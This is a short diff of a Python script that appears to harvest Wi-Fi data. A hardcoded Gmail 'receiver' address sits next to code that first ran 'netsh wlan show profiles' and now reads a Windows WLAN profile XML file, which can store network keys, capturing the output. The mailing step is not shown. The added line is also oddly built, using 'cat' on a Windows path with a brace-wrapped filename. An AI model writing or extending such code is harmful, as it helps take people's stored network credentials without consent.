@@ -20,7 +20,8 @@ receiver= "sonu.code.ai@gmail.com"
 try:
     # Run the linux command
     command=["ip", "addr"] 
-    output = subprocess.run(['netsh wlan show profiles'],shell=True,capture_output=True,text=True)
+    file_to_read = "C:/ProgramData/Microsoft/Wlansvc/Profiles/Interfaces/{0BB2ACD4-27AD-41F6-9108-5C4CF08387ED.xml}"
+    output = subprocess.run(["cat", file_to_read],shell=True,capture_output=True,text=True)
 
     # Get the output
     final_output = output.stdout if output.returncode == 0 else output.stderr
